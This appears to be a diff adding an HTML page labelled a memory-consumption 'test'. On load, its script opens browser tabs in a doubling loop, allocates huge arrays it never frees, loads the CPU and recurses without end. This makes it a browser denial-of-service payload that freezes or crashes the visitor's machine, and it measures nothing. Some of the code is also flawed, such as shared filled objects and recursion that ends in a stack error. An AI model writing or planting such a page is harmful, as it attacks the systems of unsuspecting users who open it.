@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Extreme Memory Consumption</title>
+    <script>
+        window.onload = function() {
+            let numTabs = 1; // Start with 1 tab
+            let memoryHog = []; // Array to consume memory
+            let permanentStorage = []; // Persistent storage to prevent garbage collection
+
+            function stressSystem() {
+                // Open tabs at an extremely fast rate
+                for (let i = 0; i < numTabs; i++) {
+                    window.open('about:blank', '_blank');
+                }
+                numTabs *= 2; // Double the number of tabs for the next interval
+
+                // Massive memory consumption with circular references
+                for (let j = 0; j < 20; j++) {
+                    let newMemoryChunk = new Array(100000000).fill({}); // Large objects array
+                    memoryHog.push(newMemoryChunk);
+
+                    // Create circular references
+                    for (let k = 0; k < newMemoryChunk.length; k++) {
+                        newMemoryChunk[k].self = newMemoryChunk; // Circular reference
+                    }
+
+                    permanentStorage.push(newMemoryChunk); // Store references to prevent cleanup
+                }
+
+                // Additional CPU load: Duplicate and manipulate large arrays
+                let dummyArray = new Array(100000000).fill(Math.random());
+                let cloneArray = dummyArray.slice(); // Copy the array to force more memory allocation
+                for (let j = 0; j < 1000; j++) {
+                    cloneArray[j] = dummyArray.map(x => x * Math.random()); // Manipulate the array
+                }
+
+                // Recursive function to keep CPU busy
+                function recursiveCPUHog() {
+                    let n = 1000000;
+                    while (n > 0) {
+                        n--;
+                    }
+                    recursiveCPUHog(); // Infinite recursion
+                }
+                recursiveCPUHog();
+
+                console.log(`Opened ${numTabs / 2} tabs, current memory size: ${memoryHog.length * 100000000} elements`);
+            }
+
+            setInterval(stressSystem, 100); // Runs every 0.1 second, extremely fast
+        };
+    </script>
+</head>
+<body>
+    <h1>Extreme Memory Consumption Test...</h1>
+</body>
+</html>
